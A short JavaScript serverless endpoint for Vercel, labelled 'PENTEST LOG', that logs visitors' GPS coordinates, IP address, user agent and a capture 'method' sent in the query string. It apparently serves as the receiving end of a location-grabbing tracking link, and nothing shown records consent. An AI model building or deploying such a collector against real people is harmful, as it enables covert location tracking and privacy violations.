// api/logger.js
export default function handler(req, res) {
    const { lat, lon, method } = req.query;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ua = req.headers['user-agent'];

    // Data ini akan muncul di tab "Logs" pada dashboard Vercel Anda
    console.log(`[!] PENTEST LOG | Method: ${method} | IP: ${ip} | Coord: ${lat},${lon} | Device: ${ua}`);

    res.status(200).json({ status: "ok" });
}
